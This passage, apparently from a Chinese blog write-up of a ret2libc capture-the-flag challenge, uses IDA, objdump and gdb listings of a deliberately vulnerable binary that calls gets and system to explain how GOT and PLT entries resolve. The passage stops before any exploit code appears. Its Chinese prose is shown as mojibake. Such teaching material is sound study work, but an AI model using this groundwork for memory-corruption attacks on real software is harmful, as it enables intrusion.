</span><span class=lnt id=hl-3-10><a class=lnlinks href=#hl-3-10> 10</a>
</span><span class=lnt id=hl-3-11><a class=lnlinks href=#hl-3-11> 11</a>
</span><span class=lnt id=hl-3-12><a class=lnlinks href=#hl-3-12> 12</a>
</span><span class=lnt id=hl-3-13><a class=lnlinks href=#hl-3-13> 13</a>
</span><span class=lnt id=hl-3-14><a class=lnlinks href=#hl-3-14> 14</a>
</span><span class=lnt id=hl-3-15><a class=lnlinks href=#hl-3-15> 15</a>
</span><span class=lnt id=hl-3-16><a class=lnlinks href=#hl-3-16> 16</a>
</span><span class=lnt id=hl-3-17><a class=lnlinks href=#hl-3-17> 17</a>
</span><span class=lnt id=hl-3-18><a class=lnlinks href=#hl-3-18> 18</a>
</span><span class=lnt id=hl-3-19><a class=lnlinks href=#hl-3-19> 19</a>
</span><span class=lnt id=hl-3-20><a class=lnlinks href=#hl-3-20> 20</a>
</span><span class=lnt id=hl-3-21><a class=lnlinks href=#hl-3-21> 21</a>
</span><span class=lnt id=hl-3-22><a class=lnlinks href=#hl-3-22> 22</a>
</span><span class=lnt id=hl-3-23><a class=lnlinks href=#hl-3-23> 23</a>
</span><span class=lnt id=hl-3-24><a class=lnlinks href=#hl-3-24> 24</a>
</span><span class=lnt id=hl-3-25><a class=lnlinks href=#hl-3-25> 25</a>
</span><span class=lnt id=hl-3-26><a class=lnlinks href=#hl-3-26> 26</a>
</span><span class=lnt id=hl-3-27><a class=lnlinks href=#hl-3-27> 27</a>
</span><span class=lnt id=hl-3-28><a class=lnlinks href=#hl-3-28> 28</a>
</span><span class=lnt id=hl-3-29><a class=lnlinks href=#hl-3-29> 29</a>
</span><span class=lnt id=hl-3-30><a class=lnlinks href=#hl-3-30> 30</a>
</span><span class=lnt id=hl-3-31><a class=lnlinks href=#hl-3-31> 31</a>
</span><span class=lnt id=hl-3-32><a class=lnlinks href=#hl-3-32> 32</a>
</span><span class=lnt id=hl-3-33><a class=lnlinks href=#hl-3-33> 33</a>
</span><span class=lnt id=hl-3-34><a class=lnlinks href=#hl-3-34> 34</a>
</span><span class=lnt id=hl-3-35><a class=lnlinks href=#hl-3-35> 35</a>
</span><span class=lnt id=hl-3-36><a class=lnlinks href=#hl-3-36> 36</a>
</span><span class=lnt id=hl-3-37><a class=lnlinks href=#hl-3-37> 37</a>
</span><span class=lnt id=hl-3-38><a class=lnlinks href=#hl-3-38> 38</a>
</span><span class=lnt id=hl-3-39><a class=lnlinks href=#hl-3-39> 39</a>
</span><span class=lnt id=hl-3-40><a class=lnlinks href=#hl-3-40> 40</a>
</span><span class=lnt id=hl-3-41><a class=lnlinks href=#hl-3-41> 41</a>
</span><span class=lnt id=hl-3-42><a class=lnlinks href=#hl-3-42> 42</a>
</span><span class=lnt id=hl-3-43><a class=lnlinks href=#hl-3-43> 43</a>
</span><span class=lnt id=hl-3-44><a class=lnlinks href=#hl-3-44> 44</a>
</span><span class=lnt id=hl-3-45><a class=lnlinks href=#hl-3-45> 45</a>
</span><span class=lnt id=hl-3-46><a class=lnlinks href=#hl-3-46> 46</a>
</span><span class=lnt id=hl-3-47><a class=lnlinks href=#hl-3-47> 47</a>
</span><span class=lnt id=hl-3-48><a class=lnlinks href=#hl-3-48> 48</a>
</span><span class=lnt id=hl-3-49><a class=lnlinks href=#hl-3-49> 49</a>
</span><span class=lnt id=hl-3-50><a class=lnlinks href=#hl-3-50> 50</a>
</span><span class=lnt id=hl-3-51><a class=lnlinks href=#hl-3-51> 51</a>
</span><span class=lnt id=hl-3-52><a class=lnlinks href=#hl-3-52> 52</a>
</span><span class=lnt id=hl-3-53><a class=lnlinks href=#hl-3-53> 53</a>
</span><span class=lnt id=hl-3-54><a class=lnlinks href=#hl-3-54> 54</a>
</span><span class=lnt id=hl-3-55><a class=lnlinks href=#hl-3-55> 55</a>
</span><span class=lnt id=hl-3-56><a class=lnlinks href=#hl-3-56> 56</a>
</span><span class=lnt id=hl-3-57><a class=lnlinks href=#hl-3-57> 57</a>
</span><span class=lnt id=hl-3-58><a class=lnlinks href=#hl-3-58> 58</a>
</span><span class=lnt id=hl-3-59><a class=lnlinks href=#hl-3-59> 59</a>
</span><span class=lnt id=hl-3-60><a class=lnlinks href=#hl-3-60> 60</a>
</span><span class=lnt id=hl-3-61><a class=lnlinks href=#hl-3-61> 61</a>
</span><span class=lnt id=hl-3-62><a class=lnlinks href=#hl-3-62> 62</a>
</span><span class=lnt id=hl-3-63><a class=lnlinks href=#hl-3-63> 63</a>
</span><span class=lnt id=hl-3-64><a class=lnlinks href=#hl-3-64> 64</a>
</span><span class=lnt id=hl-3-65><a class=lnlinks href=#hl-3-65> 65</a>
</span><span class=lnt id=hl-3-66><a class=lnlinks href=#hl-3-66> 66</a>
</span><span class=lnt id=hl-3-67><a class=lnlinks href=#hl-3-67> 67</a>
</span><span class=lnt id=hl-3-68><a class=lnlinks href=#hl-3-68> 68</a>
</span><span class=lnt id=hl-3-69><a class=lnlinks href=#hl-3-69> 69</a>
</span><span class=lnt id=hl-3-70><a class=lnlinks href=#hl-3-70> 70</a>
</span><span class=lnt id=hl-3-71><a class=lnlinks href=#hl-3-71> 71</a>
</span><span class=lnt id=hl-3-72><a class=lnlinks href=#hl-3-72> 72</a>
</span><span class=lnt id=hl-3-73><a class=lnlinks href=#hl-3-73> 73</a>
</span><span class=lnt id=hl-3-74><a class=lnlinks href=#hl-3-74> 74</a>
</span><span class=lnt id=hl-3-75><a class=lnlinks href=#hl-3-75> 75</a>
</span><span class=lnt id=hl-3-76><a class=lnlinks href=#hl-3-76> 76</a>
</span><span class=lnt id=hl-3-77><a class=lnlinks href=#hl-3-77> 77</a>
</span><span class=lnt id=hl-3-78><a class=lnlinks href=#hl-3-78> 78</a>
</span><span class=lnt id=hl-3-79><a class=lnlinks href=#hl-3-79> 79</a>
</span><span class=lnt id=hl-3-80><a class=lnlinks href=#hl-3-80> 80</a>
</span><span class=lnt id=hl-3-81><a class=lnlinks href=#hl-3-81> 81</a>
</span><span class=lnt id=hl-3-82><a class=lnlinks href=#hl-3-82> 82</a>
</span><span class=lnt id=hl-3-83><a class=lnlinks href=#hl-3-83> 83</a>
</span><span class=lnt id=hl-3-84><a class=lnlinks href=#hl-3-84> 84</a>
</span><span class=lnt id=hl-3-85><a class=lnlinks href=#hl-3-85> 85</a>
</span><span class=lnt id=hl-3-86><a class=lnlinks href=#hl-3-86> 86</a>
</span><span class=lnt id=hl-3-87><a class=lnlinks href=#hl-3-87> 87</a>
</span><span class=lnt id=hl-3-88><a class=lnlinks href=#hl-3-88> 88</a>
</span><span class=lnt id=hl-3-89><a class=lnlinks href=#hl-3-89> 89</a>
</span><span class=lnt id=hl-3-90><a class=lnlinks href=#hl-3-90> 90</a>
</span><span class=lnt id=hl-3-91><a class=lnlinks href=#hl-3-91> 91</a>
</span><span class=lnt id=hl-3-92><a class=lnlinks href=#hl-3-92> 92</a>
</span><span class=lnt id=hl-3-93><a class=lnlinks href=#hl-3-93> 93</a>
</span><span class=lnt id=hl-3-94><a class=lnlinks href=#hl-3-94> 94</a>
</span><span class=lnt id=hl-3-95><a class=lnlinks href=#hl-3-95> 95</a>
</span><span class=lnt id=hl-3-96><a class=lnlinks href=#hl-3-96> 96</a>
</span><span class=lnt id=hl-3-97><a class=lnlinks href=#hl-3-97> 97</a>
</span><span class=lnt id=hl-3-98><a class=lnlinks href=#hl-3-98> 98</a>
</span><span class=lnt id=hl-3-99><a class=lnlinks href=#hl-3-99> 99</a>
</span><span class=lnt id=hl-3-100><a class=lnlinks href=#hl-3-100>100</a>
</span><span class=lnt id=hl-3-101><a class=lnlinks href=#hl-3-101>101</a>
</span><span class=lnt id=hl-3-102><a class=lnlinks href=#hl-3-102>102</a>
</span><span class=lnt id=hl-3-103><a class=lnlinks href=#hl-3-103>103</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.got:08049FFC ; ===========================================================================
</span></span><span class=line><span class=cl>.got:08049FFC
</span></span><span class=line><span class=cl>.got:08049FFC ; Segment type: Pure data
</span></span><span class=line><span class=cl>.got:08049FFC ; Segment permissions: Read/Write
</span></span><span class=line><span class=cl>.got:08049FFC _got            segment dword public &#39;DATA&#39; use32
</span></span><span class=line><span class=cl>.got:08049FFC                 assume cs:_got
</span></span><span class=line><span class=cl>.got:08049FFC                 ;org 8049FFCh
</span></span><span class=line><span class=cl>.got:08049FFC __gmon_start___ptr dd offset __gmon_start__
</span></span><span class=line><span class=cl>.got:08049FFC                                         ; DATA XREF: _init_proc+Fâ†‘r
</span></span><span class=line><span class=cl>.got:08049FFC _got            ends
</span></span><span class=line><span class=cl>.got:08049FFC
</span></span><span class=line><span class=cl>.got.plt:0804A000 ; ===========================================================================
</span></span><span class=line><span class=cl>.got.plt:0804A000
</span></span><span class=line><span class=cl>.got.plt:0804A000 ; Segment type: Pure data
</span></span><span class=line><span class=cl>.got.plt:0804A000 ; Segment permissions: Read/Write
</span></span><span class=line><span class=cl>.got.plt:0804A000 _got_plt        segment dword public &#39;DATA&#39; use32
</span></span><span class=line><span class=cl>.got.plt:0804A000                 assume cs:_got_plt
</span></span><span class=line><span class=cl>.got.plt:0804A000                 ;org 804A000h
</span></span><span class=line><span class=cl>.got.plt:0804A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC
</span></span><span class=line><span class=cl>.got.plt:0804A000                                         ; DATA XREF: _init_proc+9â†‘o
</span></span><span class=line><span class=cl>.got.plt:0804A000                                         ; __libc_csu_init+Bâ†‘o ...
</span></span><span class=line><span class=cl>.got.plt:0804A004 dword_804A004   dd 0                    ; DATA XREF: sub_8048420â†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A008 dword_804A008   dd 0                    ; DATA XREF: sub_8048420+6â†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A00C off_804A00C     dd offset gets          ; DATA XREF: _getsâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A010 off_804A010     dd offset time          ; DATA XREF: _timeâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A014 off_804A014     dd offset puts          ; DATA XREF: _putsâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A018 off_804A018     dd offset system        ; DATA XREF: _systemâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A01C off_804A01C     dd offset __gmon_start__
</span></span><span class=line><span class=cl>.got.plt:0804A01C                                         ; DATA XREF: ___gmon_start__â†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A020 off_804A020     dd offset srand         ; DATA XREF: _srandâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A024 off_804A024     dd offset __libc_start_main
</span></span><span class=line><span class=cl>.got.plt:0804A024                                         ; DATA XREF: ___libc_start_mainâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A028 off_804A028     dd offset setvbuf       ; DATA XREF: _setvbufâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A02C off_804A02C     dd offset rand          ; DATA XREF: _randâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A030 off_804A030     dd offset __isoc99_scanf
</span></span><span class=line><span class=cl>.got.plt:0804A030                                         ; DATA XREF: ___isoc99_scanfâ†‘r
</span></span><span class=line><span class=cl>.got.plt:0804A030 _got_plt        ends
</span></span><span class=line><span class=cl>.got.plt:0804A030
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.plt:08048420 ; ===========================================================================
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420 ; Segment type: Pure code
</span></span><span class=line><span class=cl>.plt:08048420 ; Segment permissions: Read/Execute
</span></span><span class=line><span class=cl>.plt:08048420 _plt            segment para public &#39;CODE&#39; use32
</span></span><span class=line><span class=cl>.plt:08048420                 assume cs:_plt
</span></span><span class=line><span class=cl>.plt:08048420                 ;org 8048420h
</span></span><span class=line><span class=cl>.plt:08048420                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420 ; =============== S U B R O U T I N E =======================================
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420
</span></span><span class=line><span class=cl>.plt:08048420 sub_8048420     proc near               ; CODE XREF: .plt:0804843Bâ†“j
</span></span><span class=line><span class=cl>.plt:08048420                                         ; .plt:0804844Bâ†“j ...
</span></span><span class=line><span class=cl>.plt:08048420 ; __unwind {
</span></span><span class=line><span class=cl>.plt:08048420                 push    ds:dword_804A004
</span></span><span class=line><span class=cl>.plt:08048426                 jmp     ds:dword_804A008
</span></span><span class=line><span class=cl>.plt:08048426 sub_8048420     endp
</span></span><span class=line><span class=cl>.plt:08048426
</span></span><span class=line><span class=cl>.plt:08048426 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:0804842C                 align 10h
</span></span><span class=line><span class=cl>.plt:08048430 ; [00000006 BYTES: COLLAPSED FUNCTION _gets. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:08048436 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048436                 push    0
</span></span><span class=line><span class=cl>.plt:0804843B                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:08048440 ; [00000006 BYTES: COLLAPSED FUNCTION _time. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:08048446 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048446                 push    8
</span></span><span class=line><span class=cl>.plt:0804844B                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:08048450 ; [00000006 BYTES: COLLAPSED FUNCTION _puts. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:08048456 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048456                 push    10h
</span></span><span class=line><span class=cl>.plt:0804845B                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:08048466 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048466                 push    18h
</span></span><span class=line><span class=cl>.plt:0804846B                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:08048470 ; [00000006 BYTES: COLLAPSED FUNCTION ___gmon_start__. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:08048476 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048476                 push    20h ; &#39; &#39;
</span></span><span class=line><span class=cl>.plt:0804847B                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:08048480 ; [00000006 BYTES: COLLAPSED FUNCTION _srand. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:08048486 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048486                 push    28h ; &#39;(&#39;
</span></span><span class=line><span class=cl>.plt:0804848B                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:08048490 ; [00000006 BYTES: COLLAPSED FUNCTION ___libc_start_main. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:08048496 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048496                 push    30h ; &#39;0&#39;
</span></span><span class=line><span class=cl>.plt:0804849B                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:080484A0 ; [00000006 BYTES: COLLAPSED FUNCTION _setvbuf. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:080484A6 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:080484A6                 push    38h ; &#39;8&#39;
</span></span><span class=line><span class=cl>.plt:080484AB                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:080484B0 ; [00000006 BYTES: COLLAPSED FUNCTION _rand. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:080484B6 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:080484B6                 push    40h ; &#39;@&#39;
</span></span><span class=line><span class=cl>.plt:080484BB                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:080484C0 ; [00000006 BYTES: COLLAPSED FUNCTION ___isoc99_scanf. PRESS CTRL-NUMPAD+ TO EXPAND]
</span></span><span class=line><span class=cl>.plt:080484C6 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:080484C6                 push    48h ; &#39;H&#39;
</span></span><span class=line><span class=cl>.plt:080484CB                 jmp     sub_8048420
</span></span><span class=line><span class=cl>.plt:080484CB ; } // starts at 8048420
</span></span><span class=line><span class=cl>.plt:080484CB _plt            ends
</span></span><span class=line><span class=cl>.plt:080484CB</span></span></code></pre></td></tr></table></div></div><p>ç›¸å…³çš„æ®µæœ‰ä¸‰ä¸ª <code>.got</code>ã€<code>.got.plt</code> å’Œ <code>.plt</code>ï¼Œå®ƒä»¬çš„ä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li><code>.got</code>ï¼šå­˜å‚¨å…¨å±€å˜é‡å’Œå‡½æ•°çš„åœ°å€ï¼Œé€šå¸¸åœ¨ç¨‹åºåŠ è½½æ—¶å°±ä¼šè¢«è§£æå¹¶å¡«å…¥ã€‚</li><li><code>.got.plt</code>ï¼šå­˜å‚¨å»¶è¿Ÿç»‘å®šçš„å‡½æ•°åœ°å€ï¼Œåˆå§‹æ—¶æŒ‡å‘ PLT ä¸­çš„è·³è½¬æŒ‡ä»¤ã€‚</li><li><code>.plt</code>ï¼šå­˜å‚¨å‡½æ•°çš„è·³è½¬æŒ‡ä»¤ï¼Œåˆå§‹æ—¶ä¼šè·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨è¿›è¡Œåœ°å€è§£æã€‚</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-4-1><a class=lnlinks href=#hl-4-1> 1</a>
</span><span class=lnt id=hl-4-2><a class=lnlinks href=#hl-4-2> 2</a>
</span><span class=lnt id=hl-4-3><a class=lnlinks href=#hl-4-3> 3</a>
</span><span class=lnt id=hl-4-4><a class=lnlinks href=#hl-4-4> 4</a>
</span><span class=lnt id=hl-4-5><a class=lnlinks href=#hl-4-5> 5</a>
</span><span class=lnt id=hl-4-6><a class=lnlinks href=#hl-4-6> 6</a>
</span><span class=lnt id=hl-4-7><a class=lnlinks href=#hl-4-7> 7</a>
</span><span class=lnt id=hl-4-8><a class=lnlinks href=#hl-4-8> 8</a>
</span><span class=lnt id=hl-4-9><a class=lnlinks href=#hl-4-9> 9</a>
</span><span class=lnt id=hl-4-10><a class=lnlinks href=#hl-4-10>10</a>
</span><span class=lnt id=hl-4-11><a class=lnlinks href=#hl-4-11>11</a>
</span><span class=lnt id=hl-4-12><a class=lnlinks href=#hl-4-12>12</a>
</span><span class=lnt id=hl-4-13><a class=lnlinks href=#hl-4-13>13</a>
</span><span class=lnt id=hl-4-14><a class=lnlinks href=#hl-4-14>14</a>
</span><span class=lnt id=hl-4-15><a class=lnlinks href=#hl-4-15>15</a>
</span><span class=lnt id=hl-4-16><a class=lnlinks href=#hl-4-16>16</a>
</span><span class=lnt id=hl-4-17><a class=lnlinks href=#hl-4-17>17</a>
</span><span class=lnt id=hl-4-18><a class=lnlinks href=#hl-4-18>18</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.got.plt:0804A014 off_804A014     dd offset puts          ; DATA XREF: _putsâ†‘r
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.plt:08048450
</span></span><span class=line><span class=cl>.plt:08048450 ; =============== S U B R O U T I N E =======================================
</span></span><span class=line><span class=cl>.plt:08048450
</span></span><span class=line><span class=cl>.plt:08048450 ; Attributes: thunk
</span></span><span class=line><span class=cl>.plt:08048450
</span></span><span class=line><span class=cl>.plt:08048450 ; int puts(const char *s)
</span></span><span class=line><span class=cl>.plt:08048450 _puts           proc near               ; CODE XREF: main+5Aâ†“p
</span></span><span class=line><span class=cl>.plt:08048450
</span></span><span class=line><span class=cl>.plt:08048450 s               = dword ptr  4
</span></span><span class=line><span class=cl>.plt:08048450
</span></span><span class=line><span class=cl>.plt:08048450                 jmp     ds:off_804A014
</span></span><span class=line><span class=cl>.plt:08048450 _puts           endp
</span></span><span class=line><span class=cl>.plt:08048450
</span></span><span class=line><span class=cl>.plt:08048456 ; ---------------------------------------------------------------------------
</span></span><span class=line><span class=cl>.plt:08048456                 push    10h
</span></span><span class=line><span class=cl>.plt:0804845B                 jmp     sub_8048420</span></span></code></pre></td></tr></table></div></div><p>ä½¿ç”¨ <code>objdump</code> çœ‹çœ‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-5-1><a class=lnlinks href=#hl-5-1>1</a>
</span><span class=lnt id=hl-5-2><a class=lnlinks href=#hl-5-2>2</a>
</span><span class=lnt id=hl-5-3><a class=lnlinks href=#hl-5-3>3</a>
</span><span class=lnt id=hl-5-4><a class=lnlinks href=#hl-5-4>4</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=m>08048450</span> &lt;puts@plt&gt;:
</span></span><span class=line><span class=cl> 8048450: ff <span class=m>25</span> <span class=m>14</span> a0 <span class=m>04</span> <span class=m>08</span>     jmp    DWORD PTR ds:0x804a014
</span></span><span class=line><span class=cl> 8048456: <span class=m>68</span> <span class=m>10</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>        push   0x10
</span></span><span class=line><span class=cl> 804845b: e9 c0 ff ff ff        jmp    <span class=m>8048420</span> &lt;.plt&gt;</span></span></code></pre></td></tr></table></div></div><p>å‘ç° .plt æ®µçš„æ¯æ®µæŒ‡ä»¤æœ€åéƒ½ä¼š <code>jmp</code> åˆ° <code>sub_8048420</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-6-1><a class=lnlinks href=#hl-6-1>1</a>
</span><span class=lnt id=hl-6-2><a class=lnlinks href=#hl-6-2>2</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>   0x8048420                   push   dword ptr <span class=o>[</span>0x804a004<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x8048426                   jmp    dword ptr <span class=o>[</span>0x804a008<span class=o>]</span>       &lt;0xf7fd8640&gt;</span></span></code></pre></td></tr></table></div></div><p>è¿™ä¸¤è¡Œå°±æ˜¯ sub_8048420 å¤„çš„ä»£ç ï¼Œæ˜¯ plt å¤´éƒ¨çš„æŒ‡ä»¤
0x804a008 å¤„å­˜æ”¾ç€ <code>_dl_runtime_resolve</code> åº“å‡½æ•°çš„åœ°å€ï¼Œè´Ÿè´£ç¬¦å·è§£æå’Œé‡å®šä½å·¥ä½œ</p><p>ç»“åˆ gdb è°ƒè¯•çœ‹çœ‹:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-7-1><a class=lnlinks href=#hl-7-1> 1</a>
</span><span class=lnt id=hl-7-2><a class=lnlinks href=#hl-7-2> 2</a>
</span><span class=lnt id=hl-7-3><a class=lnlinks href=#hl-7-3> 3</a>
</span><span class=lnt id=hl-7-4><a class=lnlinks href=#hl-7-4> 4</a>
</span><span class=lnt id=hl-7-5><a class=lnlinks href=#hl-7-5> 5</a>
</span><span class=lnt id=hl-7-6><a class=lnlinks href=#hl-7-6> 6</a>
</span><span class=lnt id=hl-7-7><a class=lnlinks href=#hl-7-7> 7</a>
</span><span class=lnt id=hl-7-8><a class=lnlinks href=#hl-7-8> 8</a>
</span><span class=lnt id=hl-7-9><a class=lnlinks href=#hl-7-9> 9</a>
</span><span class=lnt id=hl-7-10><a class=lnlinks href=#hl-7-10>10</a>
</span><span class=lnt id=hl-7-11><a class=lnlinks href=#hl-7-11>11</a>
</span><span class=lnt id=hl-7-12><a class=lnlinks href=#hl-7-12>12</a>
</span><span class=lnt id=hl-7-13><a class=lnlinks href=#hl-7-13>13</a>
</span><span class=lnt id=hl-7-14><a class=lnlinks href=#hl-7-14>14</a>
</span><span class=lnt id=hl-7-15><a class=lnlinks href=#hl-7-15>15</a>
</span><span class=lnt id=hl-7-16><a class=lnlinks href=#hl-7-16>16</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class=o>[</span> DISASM / i386 / <span class=nb>set</span> emulate on <span class=o>]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class=line><span class=cl>   0x8048653 &lt;main+59&gt;     mov    dword ptr <span class=o>[</span>esp + 8<span class=o>]</span>, <span class=m>1</span>         <span class=o>[</span>0xffffcc18<span class=o>]</span> &lt;<span class=o>=</span> <span class=m>1</span>
</span></span><span class=line><span class=cl>   0x804865b &lt;main+67&gt;     mov    dword ptr <span class=o>[</span>esp + 4<span class=o>]</span>, <span class=m>0</span>         <span class=o>[</span>0xffffcc14<span class=o>]</span> &lt;<span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>   0x8048663 &lt;main+75&gt;     mov    dword ptr <span class=o>[</span>esp<span class=o>]</span>, eax           <span class=o>[</span>0xffffcc10<span class=o>]</span> &lt;<span class=o>=</span> 0xf7f6a5c0 <span class=o>(</span>_IO_2_1_stdin_<span class=o>)</span> â—‚â€” 0xfbad2088
</span></span><span class=line><span class=cl>   0x8048666 &lt;main+78&gt;     call   setvbuf@plt                 &lt;setvbuf@plt&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   0x804866b &lt;main+83&gt;     mov    dword ptr <span class=o>[</span>esp<span class=o>]</span>, 0x8048733     <span class=o>[</span>0xffffcc10<span class=o>]</span> &lt;<span class=o>=</span> 0x8048733 â—‚â€” push edx /* <span class=s1>&#39;RET2LIBC &gt;_&lt;&#39;</span> */
</span></span><span class=line><span class=cl> â–º 0x8048672 &lt;main+90&gt;     call   puts@plt                    &lt;puts@plt&gt;
</span></span><span class=line><span class=cl>        s: 0x8048733 â—‚â€” <span class=s1>&#39;RET2LIBC &gt;_&lt;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   0x8048677 &lt;main+95&gt;     lea    eax, <span class=o>[</span>esp + 0x1c<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x804867b &lt;main+99&gt;     mov    dword ptr <span class=o>[</span>esp<span class=o>]</span>, eax
</span></span><span class=line><span class=cl>   0x804867e &lt;main+102&gt;    call   gets@plt                    &lt;gets@plt&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   0x8048683 &lt;main+107&gt;    mov    eax, <span class=m>0</span>     <span class=nv>EAX</span> <span class=o>=</span>&gt; <span class=m>0</span>
</span></span><span class=line><span class=cl>   0x8048688 &lt;main+112&gt;    leave</span></span></code></pre></td></tr></table></div></div><p>æŸ¥çœ‹ got plt è¡¨</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-8-1><a class=lnlinks href=#hl-8-1> 1</a>
</span><span class=lnt id=hl-8-2><a class=lnlinks href=#hl-8-2> 2</a>
</span><span class=lnt id=hl-8-3><a class=lnlinks href=#hl-8-3> 3</a>
</span><span class=lnt id=hl-8-4><a class=lnlinks href=#hl-8-4> 4</a>
</span><span class=lnt id=hl-8-5><a class=lnlinks href=#hl-8-5> 5</a>
</span><span class=lnt id=hl-8-6><a class=lnlinks href=#hl-8-6> 6</a>
</span><span class=lnt id=hl-8-7><a class=lnlinks href=#hl-8-7> 7</a>
</span><span class=lnt id=hl-8-8><a class=lnlinks href=#hl-8-8> 8</a>
</span><span class=lnt id=hl-8-9><a class=lnlinks href=#hl-8-9> 9</a>
</span><span class=lnt id=hl-8-10><a class=lnlinks href=#hl-8-10>10</a>
</span><span class=lnt id=hl-8-11><a class=lnlinks href=#hl-8-11>11</a>
</span><span class=lnt id=hl-8-12><a class=lnlinks href=#hl-8-12>12</a>
</span><span class=lnt id=hl-8-13><a class=lnlinks href=#hl-8-13>13</a>
</span><span class=lnt id=hl-8-14><a class=lnlinks href=#hl-8-14>14</a>
</span><span class=lnt id=hl-8-15><a class=lnlinks href=#hl-8-15>15</a>
</span><span class=lnt id=hl-8-16><a class=lnlinks href=#hl-8-16>16</a>
</span><span class=lnt id=hl-8-17><a class=lnlinks href=#hl-8-17>17</a>
</span><span class=lnt id=hl-8-18><a class=lnlinks href=#hl-8-18>18</a>
</span><span class=lnt id=hl-8-19><a class=lnlinks href=#hl-8-19>19</a>
</span><span class=lnt id=hl-8-20><a class=lnlinks href=#hl-8-20>20</a>
</span><span class=lnt id=hl-8-21><a class=lnlinks href=#hl-8-21>21</a>
</span><span class=lnt id=hl-8-22><a class=lnlinks href=#hl-8-22>22</a>
</span><span class=lnt id=hl-8-23><a class=lnlinks href=#hl-8-23>23</a>
</span><span class=lnt id=hl-8-24><a class=lnlinks href=#hl-8-24>24</a>
